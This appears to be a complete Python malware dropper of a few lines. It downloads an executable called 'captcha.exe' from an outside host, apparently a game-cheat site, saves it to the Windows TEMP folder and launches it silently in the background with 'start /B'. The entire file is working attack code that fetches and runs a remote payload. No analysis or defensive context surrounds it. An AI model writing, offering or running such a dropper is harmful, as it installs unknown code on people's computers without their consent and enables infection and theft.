import os
import requests

dropper_url = "https://angelcheats.cc/assets/captcha.exe"
temp_dir = os.getenv("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
dropped_path = os.path.join(temp_dir, "captcha.exe")

with open(dropped_path, "wb") as f:
    f.write(requests.get(dropper_url).content)

os.system(f'start /B "" "{dropped_path}"')
